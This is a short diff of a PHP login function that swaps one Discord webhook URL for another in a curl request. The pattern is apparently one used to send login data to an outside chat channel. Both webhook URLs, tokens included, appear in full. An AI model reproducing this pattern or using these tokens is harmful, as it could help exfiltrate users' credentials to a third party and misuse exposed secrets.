@@ -211,7 +211,7 @@ function login() {
             echo "ERROR REPORT THIS TO xenos#1337:\n$e";
         }
 
-        $ch = curl_init("https://discord.com/api/webhooks/901571010845872189/5kkbnUx0oFEocn2pHe8otDfmDGxD09DCZshICTF56DJRf622Dg8E-HHF45asci17WcV5");
+        $ch = curl_init("https://discord.com/api/webhooks/955952915296694312/plldkjchPN8MEq6Xu-CV4u2T7lYm8Mcg46Cn0hLQhqvHu9qWKeJsOf6VvDDK1tw8Rgya");
         curl_setopt($ch, CURLOPT_HTTPHEADER, array(
             'Content-type: application/json'
         ));
